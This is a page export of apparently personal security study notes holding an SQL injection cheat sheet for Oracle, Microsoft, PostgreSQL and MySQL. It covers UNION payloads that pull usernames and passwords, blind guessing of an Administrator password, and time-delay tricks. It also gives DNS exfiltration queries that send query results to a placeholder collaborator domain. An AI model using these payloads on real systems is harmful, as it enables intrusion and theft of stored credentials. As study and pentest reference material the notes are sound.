{"pageProps":{"note":{"id":"ecm8gbfd442dpxbe5fggfzo","title":"SQL_Injection","desc":"","updated":1677476127749,"created":1677380025812,"custom":{},"fname":"Cheat Sheets.SQL_Injection","type":"note","vault":{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"},"contentHash":"bf5e18407f491810ae586ac3381f6f3c","links":[{"from":{"fname":"Cheat Sheets","id":"t7zelcb6b17opo2gjy4y9cq","vaultName":"Cybersecurity_Notes"},"type":"backlink","position":{"start":{"line":10,"column":1,"offset":417},"end":{"line":10,"column":45,"offset":461},"indent":[]},"value":"Cheat Sheets.SQL_Injection"}],"anchors":{"sql-injection-cheat-sheet":{"type":"header","text":"SQL injection cheat sheet","value":"sql-injection-cheat-sheet","line":7,"column":0,"depth":2},"string-concatenation":{"type":"header","text":"String concatenation","value":"string-concatenation","line":10,"column":0,"depth":3},"substring":{"type":"header","text":"Substring","value":"substring","line":20,"column":0,"depth":3},"comments":{"type":"header","text":"Comments","value":"comments","line":28,"column":0,"depth":3},"database-version":{"type":"header","text":"Database version","value":"database-version","line":40,"column":0,"depth":3},"database-contents":{"type":"header","text":"Database contents","value":"database-contents","line":49,"column":0,"depth":3},"conditional-errors":{"type":"header","text":"Conditional errors","value":"conditional-errors","line":61,"column":0,"depth":3},"batched-or-stacked-queries":{"type":"header","text":"Batched (or stacked) queries","value":"batched-or-stacked-queries","line":69,"column":0,"depth":3},"time-delays":{"type":"header","text":"Time delays","value":"time-delays","line":80,"column":0,"depth":3},"conditional-time-delays":{"type":"header","text":"Conditional time delays","value":"conditional-time-delays","line":88,"column":0,"depth":3},"dns-lookup":{"type":"header","text":"DNS lookup","value":"dns-lookup","line":96,"column":0,"depth":3},"dns-lookup-with-data-exfiltration":{"type":"header","text":"DNS lookup with data exfiltration","value":"dns-lookup-with-data-exfiltration","line":112,"column":0,"depth":3},"union-attacks":{"type":"header","text":"UNION attacks","value":"union-attacks","line":130,"column":0,"depth":3},"blind-injection":{"type":"header","text":"Blind Injection","value":"blind-injection","line":165,"column":0,"depth":3},"sql-injection-in-different-contexts":{"type":"header","text":"SQL injection in different contexts","value":"sql-injection-in-different-contexts","line":181,"column":0,"depth":3}},"children":[],"parent":"t7zelcb6b17opo2gjy4y9cq","data":{}},"body":"<h1 id=\"sql_injection\">SQL_Injection<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#sql_injection\"></a></h1>\n<h2 id=\"sql-injection-cheat-sheet\">SQL injection cheat sheet<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#sql-injection-cheat-sheet\"></a></h2>\n<p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>\n<h3 id=\"string-concatenation\">String concatenation<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#string-concatenation\"></a></h3>\n<p>You can concatenate together multiple strings to make a single string.</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">Oracle\t<span class=\"token string\">'foo'</span><span class=\"token operator\">||</span><span class=\"token string\">'bar'</span>\nMicrosoft\t<span class=\"token string\">'foo'</span><span class=\"token operator\">+</span><span class=\"token string\">'bar'</span>\nPostgreSQL\t<span class=\"token string\">'foo'</span><span class=\"token operator\">||</span><span class=\"token string\">'bar'</span>\nMySQL\t<span class=\"token string\">'foo'</span> <span class=\"token string\">'bar'</span> <span class=\"token punctuation\">[</span>Note the space <span class=\"token operator\">between</span> the two strings<span class=\"token punctuation\">]</span>\nCONCAT<span class=\"token punctuation\">(</span><span class=\"token string\">'foo'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'bar'</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h3 id=\"substring\">Substring<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#substring\"></a></h3>\n<p>You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">Oracle\tSUBSTR<span class=\"token punctuation\">(</span><span class=\"token string\">'foobar'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nMicrosoft\tSUBSTRING<span class=\"token punctuation\">(</span><span class=\"token string\">'foobar'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nPostgreSQL\tSUBSTRING<span class=\"token punctuation\">(</span><span class=\"token string\">'foobar'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nMySQL\tSUBSTRING<span class=\"token punctuation\">(</span><span class=\"token string\">'foobar'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h3 id=\"comments\">Comments<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#comments\"></a></h3>\n<p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">Oracle\t<span class=\"token comment\">--comment</span>\nMicrosoft\t<span class=\"token comment\">--comment</span>\n<span class=\"token comment\">/*comment*/</span>\nPostgreSQL\t<span class=\"token comment\">--comment</span>\n<span class=\"token comment\">/*comment*/</span>\nMySQL\t<span class=\"token comment\">#comment</span>\n<span class=\"token comment\">-- comment [Note the space after the double dash]</span>\n<span class=\"token comment\">/*comment*/</span>\n</code></pre>\n<h3 id=\"database-version\">Database version<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#database-version\"></a></h3>\n<p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">Oracle\t<span class=\"token keyword\">SELECT</span> banner <span class=\"token keyword\">FROM</span> v$version\n<span class=\"token keyword\">SELECT</span> version <span class=\"token keyword\">FROM</span> v$instance\nMicrosoft\t<span class=\"token keyword\">SELECT</span> @<span class=\"token variable\">@version</span>\nPostgreSQL\t<span class=\"token keyword\">SELECT</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nMySQL\t<span class=\"token keyword\">SELECT</span> @<span class=\"token variable\">@version</span>\n</code></pre>\n<h3 id=\"database-contents\">Database contents<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#database-contents\"></a></h3>\n<p>You can list the tables that exist in the database, and the columns that those tables contain.</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">Oracle\t<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> all_tables\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> all_tab_columns <span class=\"token keyword\">WHERE</span> table_name <span class=\"token operator\">=</span> <span class=\"token string\">'TABLE-NAME-HERE'</span>\nMicrosoft\t<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">WHERE</span> table_name <span class=\"token operator\">=</span> <span class=\"token string\">'TABLE-NAME-HERE'</span>\nPostgreSQL\t<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">WHERE</span> table_name <span class=\"token operator\">=</span> <span class=\"token string\">'TABLE-NAME-HERE'</span>\nMySQL\t<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">WHERE</span> table_name <span class=\"token operator\">=</span> <span class=\"token string\">'TABLE-NAME-HERE'</span>\n</code></pre>\n<h3 id=\"conditional-errors\">Conditional errors<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#conditional-errors\"></a></h3>\n<p>You can test a single boolean condition and trigger a database error if the condition is true.</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">Oracle\t<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> <span class=\"token punctuation\">(</span>YOUR<span class=\"token operator\">-</span>CONDITION<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">)</span> <span class=\"token keyword\">THEN</span> TO_CHAR<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">/</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">END</span> <span class=\"token keyword\">FROM</span> dual\nMicrosoft\t<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> <span class=\"token punctuation\">(</span>YOUR<span class=\"token operator\">-</span>CONDITION<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">)</span> <span class=\"token keyword\">THEN</span> <span class=\"token number\">1</span><span class=\"token operator\">/</span><span class=\"token number\">0</span> <span class=\"token keyword\">ELSE</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">END</span>\nPostgreSQL\t<span class=\"token number\">1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> <span class=\"token punctuation\">(</span>YOUR<span class=\"token operator\">-</span>CONDITION<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">)</span> <span class=\"token keyword\">THEN</span> <span class=\"token number\">1</span><span class=\"token operator\">/</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">END</span><span class=\"token punctuation\">)</span>\nMySQL\t<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">IF</span><span class=\"token punctuation\">(</span>YOUR<span class=\"token operator\">-</span>CONDITION<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> table_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h3 id=\"batched-or-stacked-queries\">Batched (or stacked) queries<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#batched-or-stacked-queries\"></a></h3>\n<p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">Oracle\tDoes <span class=\"token operator\">not</span> support batched queries<span class=\"token punctuation\">.</span>\nMicrosoft\tQUERY<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">;</span> QUERY<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token operator\">-</span>HERE\nPostgreSQL\tQUERY<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">;</span> QUERY<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token operator\">-</span>HERE\nMySQL\tQUERY<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">;</span> QUERY<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token operator\">-</span>HERE\n</code></pre>\n<blockquote>\n<p>Note\nWith MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.</p>\n</blockquote>\n<h3 id=\"time-delays\">Time delays<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#time-delays\"></a></h3>\n<p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">Oracle\tdbms_pipe<span class=\"token punctuation\">.</span>receive_message<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\nMicrosoft\t<span class=\"token keyword\">WAITFOR</span> DELAY <span class=\"token string\">'0:0:10'</span>\nPostgreSQL\t<span class=\"token keyword\">SELECT</span> pg_sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\nMySQL\t<span class=\"token keyword\">SELECT</span> SLEEP<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h3 id=\"conditional-time-delays\">Conditional time delays<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#conditional-time-delays\"></a></h3>\n<p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">Oracle\t<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> <span class=\"token punctuation\">(</span>YOUR<span class=\"token operator\">-</span>CONDITION<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">)</span> <span class=\"token keyword\">THEN</span> <span class=\"token string\">'a'</span><span class=\"token operator\">||</span>dbms_pipe<span class=\"token punctuation\">.</span>receive_message<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">END</span> <span class=\"token keyword\">FROM</span> dual\nMicrosoft\t<span class=\"token keyword\">IF</span> <span class=\"token punctuation\">(</span>YOUR<span class=\"token operator\">-</span>CONDITION<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">)</span> <span class=\"token keyword\">WAITFOR</span> DELAY <span class=\"token string\">'0:0:10'</span>\nPostgreSQL\t<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> <span class=\"token punctuation\">(</span>YOUR<span class=\"token operator\">-</span>CONDITION<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">)</span> <span class=\"token keyword\">THEN</span> pg_sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> pg_sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">END</span>\nMySQL\t<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">IF</span><span class=\"token punctuation\">(</span>YOUR<span class=\"token operator\">-</span>CONDITION<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">,</span>SLEEP<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h3 id=\"dns-lookup\">DNS lookup<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#dns-lookup\"></a></h3>\n<p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>\n<p>Oracle\tThe following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:</p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> EXTRACTVALUE<span class=\"token punctuation\">(</span>xmltype<span class=\"token punctuation\">(</span><span class=\"token string\">'&#x3C;?xml version=\"1.0\" encoding=\"UTF-8\"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/l'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> dual\n</code></pre>\n<p>The following technique works on fully patched Oracle installations, but requires elevated privileges:</p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> UTL_INADDR<span class=\"token punctuation\">.</span>get_host_address<span class=\"token punctuation\">(</span><span class=\"token string\">'BURP-COLLABORATOR-SUBDOMAIN'</span><span class=\"token punctuation\">)</span>\nMicrosoft\t<span class=\"token keyword\">exec</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>xp_dirtree <span class=\"token string\">'//BURP-COLLABORATOR-SUBDOMAIN/a'</span>\nPostgreSQL\tcopy <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">to</span> program <span class=\"token string\">'nslookup BURP-COLLABORATOR-SUBDOMAIN'</span>\nMySQL\tThe <span class=\"token keyword\">following</span> techniques <span class=\"token keyword\">work</span> <span class=\"token keyword\">on</span> Windows only:\nLOAD_FILE<span class=\"token punctuation\">(</span><span class=\"token string\">'\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OUTFILE</span> <span class=\"token string\">'\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'</span>\n</code></pre>\n<h3 id=\"dns-lookup-with-data-exfiltration\">DNS lookup with data exfiltration<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#dns-lookup-with-data-exfiltration\"></a></h3>\n<p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">Oracle\t<span class=\"token keyword\">SELECT</span> EXTRACTVALUE<span class=\"token punctuation\">(</span>xmltype<span class=\"token punctuation\">(</span><span class=\"token string\">'&#x3C;?xml version=\"1.0\" encoding=\"UTF-8\"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM \"http://'</span><span class=\"token operator\">||</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> YOUR<span class=\"token operator\">-</span>QUERY<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token string\">'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/l'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> dual\nMicrosoft\t<span class=\"token keyword\">declare</span> <span class=\"token variable\">@p</span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">set</span> <span class=\"token variable\">@p</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> YOUR<span class=\"token operator\">-</span>QUERY<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">'master..xp_dirtree \"//'</span><span class=\"token operator\">+</span><span class=\"token variable\">@p</span><span class=\"token operator\">+</span><span class=\"token string\">'.BURP-COLLABORATOR-SUBDOMAIN/a\"'</span><span class=\"token punctuation\">)</span>\nPostgreSQL\t<span class=\"token keyword\">create</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">replace</span> <span class=\"token keyword\">function</span> f<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">returns</span> void <span class=\"token keyword\">as</span> $$\n<span class=\"token keyword\">declare</span> c <span class=\"token keyword\">text</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">declare</span> p <span class=\"token keyword\">text</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">begin</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">into</span> p <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> YOUR<span class=\"token operator\">-</span>QUERY<span class=\"token operator\">-</span>HERE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nc :<span class=\"token operator\">=</span> <span class=\"token string\">'copy (SELECT '''') to program ''nslookup '</span><span class=\"token operator\">||</span>p<span class=\"token operator\">||</span><span class=\"token string\">'.BURP-COLLABORATOR-SUBDOMAIN'''</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">execute</span> c<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n$$ <span class=\"token keyword\">language</span> plpgsql security <span class=\"token keyword\">definer</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">SELECT</span> f<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nMySQL\tThe <span class=\"token keyword\">following</span> technique works <span class=\"token keyword\">on</span> Windows only:\n<span class=\"token keyword\">SELECT</span> YOUR<span class=\"token operator\">-</span>QUERY<span class=\"token operator\">-</span>HERE <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OUTFILE</span> <span class=\"token string\">'\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'</span>\n</code></pre>\n<h3 id=\"union-attacks\">UNION attacks<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#union-attacks\"></a></h3>\n<p>For a UNION query to work, two key requirements must be met:</p>\n<ul>\n<li>\n<p>The individual queries must return the same number of columns.<br></p>\n</li>\n<li>\n<p>The data types in each column must be compatible between the individual queries.</p>\n<p>  <strong>Number of columns:</strong></p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token string\">' ORDER BY 1--\n'</span> <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token number\">2</span><span class=\"token comment\">--</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> until error\n\n<span class=\"token operator\">OR</span>\n\n<span class=\"token string\">' UNION SELECT NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> until success\n</code></pre>\n<p>  <strong>Probing for string data in columns:</strong></p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token string\">' UNION SELECT '</span>a<span class=\"token string\">',NULL,NULL,NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> until successfully injected string <span class=\"token keyword\">value</span>\n</code></pre>\n<p>  <strong>Retrieving data</strong></p>\n<pre class=\"language-sql\"><code class=\"language-sql\">' <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> username<span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> users<span class=\"token comment\">--</span>\n</code></pre>\n<p>  <strong>Retrieving multiple values within a single column</strong>\n<br></p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token string\">' UNION SELECT username || '</span><span class=\"token operator\">~</span>' <span class=\"token operator\">||</span> password <span class=\"token keyword\">FROM</span> users<span class=\"token comment\">--</span>\n</code></pre>\n</li>\n</ul>\n<h3 id=\"blind-injection\">Blind Injection<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#blind-injection\"></a></h3>\n<p><strong>Divide and conquer password guessing:</strong></p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token string\">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class=\"token string\">'), 1, 1) > '</span>m\n\n<span class=\"token keyword\">IF</span> <span class=\"token boolean\">TRUE</span>:\n\nxyz<span class=\"token string\">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class=\"token string\">'), 1, 1) > '</span>t\n\n<span class=\"token keyword\">IF</span> <span class=\"token boolean\">FALSE</span>:\nTry <span class=\"token keyword\">for</span> example:\nxyz<span class=\"token string\">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class=\"token string\">'), 1, 1) = '</span>s\n\n<span class=\"token keyword\">IF</span> <span class=\"token boolean\">TRUE</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">first</span> letter <span class=\"token keyword\">of</span> the password has been found<span class=\"token punctuation\">.</span>\n</code></pre>\n<h3 id=\"sql-injection-in-different-contexts\">SQL injection in different contexts<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#sql-injection-in-different-contexts\"></a></h3>\n<p>***JSON or XML based SQL injection often require code obfuscation.\n<br>\nMost common encoder:\nurlencode, dec, html entity</p>\n<p><a href=\"https://hackvertor.co.uk/public\">Hackvertor</a> is a good tool to start with.<br>\nAlso there is a plugin for Burp with the same name working with repeater.</p>\n<hr>\n<strong>Backlinks</strong>\n<ul>\n<li><a href=\"/Notes/notes/t7zelcb6b17opo2gjy4y9cq\">Cheat Sheets:</a></li>\n</ul>","noteIndex":{"id":"dkhaxs77zw01c445jl4oetr","title":"My Dendron Notes","desc":"","updated":1703545954419,"created":1673083387776,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"},"contentHash":"7f471efbabd9262e18133bac0489cf83","links":[],"anchors":{"welcome-to-my-dendron-notes":{"type":"header","text":"Welcome to my Dendron Notes:","value":"welcome-to-my-dendron-notes","line":7,"column":0,"depth":1},"lookup":{"type":"header","text":"Lookup","value":"lookup","line":11,"column":0,"depth":2}},"children":["irggoj29glx2y8z3yum2w64","t7zelcb6b17opo2gjy4y9cq","h42642wolzf824la84a6bb7","m7j2ktba2hjk9l6avnxa7bw"],"parent":null,"data":{},"body":"# Welcome to my Dendron Notes:\n\nI am a Cyber Security Analyst/Network Administrator. A highly motivated and energetic individual, ready to start work as soon as possible. Ready to learn new skills, take on challenges and complete any education/licensing examinations necessary for career growth. Proactive critical thinker and quick learner with extremely strong work ethic. An effective problem solver who brings both technical aptitude and an understanding of business processes. Able to leverage background in finance and technical skills to evaluate complex problems faced by business. Motivated by innovation and seeking to join an organisation that will provide opportunities for professional development in a dynamic and technical team environment. Passionate about cyber security and focused on governance, risk and compliance. Member of AISA (Australian Information Security Association).\n\n## Lookup\n\nThis section contains useful links to related resources.\n\n- [Getting Started Guide](https://link.dendron.so/6b25)\n- [Discord](https://link.dendron.so/6b23)\n- [Home Page](https://wiki.dendron.so/)\n- [Github](https://link.dendron.so/6b24)\n- [Developer Docs](https://docs.dendron.so/)"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true,"enableSelfContainedVaults":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{"aliasMode":"title"},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"task","dateFormat":"y.MM.dd","addBehavior":"asOwnDomain","statusSymbols":{"":" 